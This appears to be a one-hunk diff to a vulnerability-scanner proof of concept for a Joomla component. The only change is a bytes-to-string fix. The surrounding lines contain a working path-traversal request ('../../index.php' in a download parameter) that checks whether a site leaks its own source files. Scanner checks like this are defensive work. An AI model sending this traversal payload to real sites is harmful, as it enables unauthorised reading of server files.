@@ -55,7 +55,7 @@ class Poc(ABPoc):
                 "/index.php?option=com_jetext&task=download&file=../../index.php"
             request = urllib.request.Request(verify_url)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             if 'Id: index.php' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
